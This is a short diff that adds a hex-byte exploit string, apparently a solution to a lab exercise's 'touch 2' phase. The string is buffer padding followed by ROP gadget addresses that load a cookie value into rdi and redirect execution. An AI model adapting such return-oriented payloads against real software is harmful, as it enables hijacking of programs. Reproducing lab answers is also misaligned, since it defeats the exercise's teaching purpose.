@@ -1,0 +1,11 @@
+AA AA AA AA AA AA AA AA /* buf padding */
+AA AA AA AA AA AA AA AA
+AA AA AA AA AA AA AA AA
+AA AA AA AA AA AA AA AA
+AA AA AA AA AA AA AA AA
+AA AA AA AA AA AA AA AA
+AA AA AA AA AA AA AA AA
+bb 2c 40 00 00 00 00 00 /* gadget to pop rax (cookie) */
+c5 b8 ed 30 00 00 00 00 /* cookie as int */
+ce 2c 40 00 00 00 00 00 /* gadget to move rax to rdi (make cookie input) */
+c8 2b 40 00 00 00 00 00 /* addr for touch 2 */
